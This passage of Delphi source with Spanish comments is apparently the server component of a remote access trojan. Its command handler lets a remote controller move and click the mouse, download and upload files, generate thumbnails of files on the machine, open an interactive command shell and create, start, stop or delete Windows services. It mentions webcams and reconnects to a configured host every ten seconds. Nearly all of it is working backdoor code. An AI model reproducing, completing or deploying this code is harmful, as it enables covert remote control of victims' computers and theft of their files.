            TempStr := copy(recibido, 1, Pos('|', recibido) - 1);
            Delete(Recibido, 1, pos('|', Recibido));
            TempStr1 := Copy(recibido, 1, pos('|', Recibido) - 1);
            Delete(Recibido, 1, pos('|', Recibido));
            TempStr2 := Copy(recibido, 1, pos('|', Recibido) - 1);
            Delete(Recibido, 1, pos('|', Recibido));
            if TempStr2 = 'CLICKIZQ' then
            begin
              mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
              mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
              SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
            end
            else if TempStr2 = 'CLICKDER' then
            begin
              mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
              mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
              SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
            end;
          end;
          if Pos('GETTHUMB|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 9);
            Recibido := Trim(Recibido);
            if generateThumb(Recibido, Replace(Recibido, ExtractFileExt(Recibido), '') + '_th.dat')
            then //,ExtractFileDir(Recibido)+(ExtractFileName(Recibido)+'_th'+'.obj')) then
            begin
              ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
                IntToStr(SH), Replace(Recibido, ExtractFileExt(Recibido), '') + '_th.dat', 'GETFILE', 0);
              ThreadInfo.deleteAfterTransfer := True;
              //    ThreadInfo.Alias := ExtractFileDir(Recibido)+ExtractFileName(Recibido)+'_th';
              //    ThreadInfo.Alias := replace(ThreadInfo.Alias, ExtractFileExt(Recibido), '');
              //    ThreadInfo.Alias := ThreadInfo.Alias + '.jpg';
              ThreadInfo.Alias := Replace(Recibido, ExtractFileExt(Recibido), '') + '_th.jpg';

              //ThreadedTransfer(Pointer(ThreadInfo)); //para debug
              BeginThread(nil,
                0,
                Addr(ThreadedTransfer),
                ThreadInfo,
                0,
                ThreadInfo.ThreadId);
            end
            else
              sock.SendString('MSG|Thumbnail could not be generated' + ENTER);
          end;

          if Pos('GETFILE|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 8);
            Recibido   := Trim(Recibido);
            ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
              IntToStr(SH), Recibido, 'GETFILE', 0);
            //ThreadedTransfer(Pointer(ThreadInfo)); //para debug
            BeginThread(nil,
              0,
              Addr(ThreadedTransfer),
              ThreadInfo,
              0,
              ThreadInfo.ThreadId);
          end;

          if Pos('RESUMETRANSFER|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, Pos('|', Recibido));
            Recibido := Trim(Recibido);
            FilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            Recibido   := Trim(Recibido);
            ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
              IntToStr(SH), FilePath, 'RESUMETRANSFER', StrToInt(Recibido));
            BeginThread(nil,
              0,
              Addr(ThreadedTransfer),
              ThreadInfo,
              0,
              ThreadInfo.ThreadId);
          end;

          if Pos('SENDFILE|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, Pos('|', Recibido));
            Recibido := Trim(Recibido);
            FilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            LocalFilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
              IntToStr(SH), LocalFilePath, 'SENDFILE', 0);
            ThreadInfo.RemoteFileName := FilePath;
            ThreadInfo.UploadSize := StrToInt(Recibido);
            //ThreadedTransfer(Pointer(ThreadInfo)); //para debug
            //exit; //para debug junto a la linea anterior
            BeginThread(nil,
              0,
              Addr(ThreadedTransfer),
              ThreadInfo,
              0,
              ThreadInfo.ThreadId);
          end;

          if Pos('SHELL|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 6);
            if Recibido = 'ACTIVAR' then
            begin
              //      ShellParameters.Cliente := Cliente.ClientSocket;
              ShellParameters.Cliente := sock;
              if ShellThreadID = 0 then
              begin
                CreateThread(nil, 0, @ShellThread, @ShellParameters, 0, ShellThreadID);
                sock.SendString('SHELL|ACTIVAR' + ENTER);
              end;
            end
            else
            if Recibido = 'DESACTIVAR' then
            begin
              if ShellThreadID <> 0 then
                PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length('exit'),
                  DWord(string(PChar('exit'))));
            end
            else
            begin
              //Entonces es un comando para escribirle a la shell
              if ShellThreadID <> 0 then
                PostThreadMessage(ShellThreadID, WM_ACTIVATE, length(Recibido),
                  DWord(PChar(Recibido)));
            end;

          end; //if Pos('Shell', recibido) = 1

          if Recibido = 'LISTARSERVICIOS' then
            SendText('SERVICIOSWIN' + '|' + ServiceList + ENTER);

          if Pos('INICIARSERVICIO', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 15);
            ServiceStatus(Recibido, True, True);
          end;

          if Pos('DETENERSERVICIO', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 15);
            ServiceStatus(Recibido, True, False);
          end;

          if Pos('BORRARSERVICIO', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 14);
            ServicioBorrar(Recibido);
          end;

          if Pos('INSTALARSERVICIO', Recibido) = 1 then
          begin
            //Para instalar Servicio que falta de agregar en el cliente
            Delete(Recibido, 1, 16);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            //prueba//messageBox(0,pchar(tempstr+'|'+tempstr1+'|'+tempstr2),0,0);
            ServicioCrear(TempStr, TempStr1, TempStr2);
          end;
          lastCommandTime := getTickCount;
          Busy := False;
        end;//while sock.connected do
      end//try
    except
      begin
        if sock <> nil then
        begin
          if sock.Connected then
            sock.Disconnect;
          sock.Free;
          //Estamos desconectados así que tenemos que desactivar la webcam y la shell
          DesactivarWebcams(); //Desactivamos las webcams
          //La shell se desactiva automaticamente
          Exit;
        end;//if sock <> nil
      end//except
    end;//fin try/except block
  end;//Fin del OnRead del socket

{
procedure TClassClientSocket.ClientSocketReadFile(Sender: TObject;
      Socket: TCustomWinSocket);
var
  Comando: String;
  Len, LenC: Integer;
  Buffer: Pointer;
begin
  Len := Socket.ReceiveLength;
  GetMem(Buffer, Len);
  Socket.ReceiveBuf(Buffer^, Len);
  if not RecibiendoFichero then  //No se está recibiendo el fichero, se estará recibiendo un comando de SENDFILE
  begin
    //Ignoramos el comando MAININFO que envia el cliente a todas las conexiones nuevas
    if Copy(PChar(Buffer), 1, 8) = 'MAININFO' then exit;
    if Copy(PChar(Buffer), 1, 8) = 'SENDFILE' then
    begin
      Comando := Copy(PChar(Buffer), 1, Len);
      LenC := Length(Comando) + 1;  //Longitud de la cadena leida + 1 el caracter de fin de cadena #0
      Delete(Comando, 1, 8);
      Descarga.Descargado := 0;
      Descarga.SizeFile := StrToInt(Copy(Comando, 1, Pos('|', Comando) - 1));
      Delete(Comando, 1, Pos('|', Comando));
      RecibiendoFichero := True;
      FSFileUpload := TFileStream.Create(Copy(Comando, 1, Pos('|', Comando) - 1), fmCreate or fmOpenWrite);
      FSFileUpload.Position := 0;
      //A veces ocurre que leemos el comando y a continuación parte del fichero

      Inc(Pchar(Buffer), LenC);  //Desplazamos el Buffer lo que se halla leido, para que eso no se escriba en el fichero
      Len := Len - LenC;
    end;
  end;
  FSFileUpload.Write(Buffer^, Len);
  Descarga.Descargado := Descarga.Descargado + Len;
  if Descarga.SizeFile = Descarga.Descargado then
  begin
    RecibiendoFichero := False;
    FSFileUpload.Free;
  end;
end;
}
  //Inicio del programa
  //var AliveThread:TThread;
var
  id1: longword = 0;
begin
  CrearServer();
  //El server solo se instala si en la configuracion se indica
  //  Instalar();

  BeginThread(nil,
    0,
    Addr(KeepAliveThread),
    nil,
    0,
    id1);

  while True do
  begin
    //  Conectar();
    iniciar();
    sleep(1000 * 10);//duermo 10 seg antes de conectar de nuevo
  end;
  //  SetTimer(0, 0, Configuracion.iTimeToNotify*1000, @Conectar);
  //Bucle que mantendrá el programa vivo
{
  while True do
  begin
    Sleep(10);
    if PeekMessage(Msg, 0, 0, 0, PM_REMOVE) then
    begin
      if Msg.Message <> WM_QUIT then
      begin
        TranslateMessage(Msg);
        DispatchMessage(Msg);
      end
      else
        //Si deseamos hacer algo al salir ponerlo aquí
        Break;
    end;
  end;
  }
end.
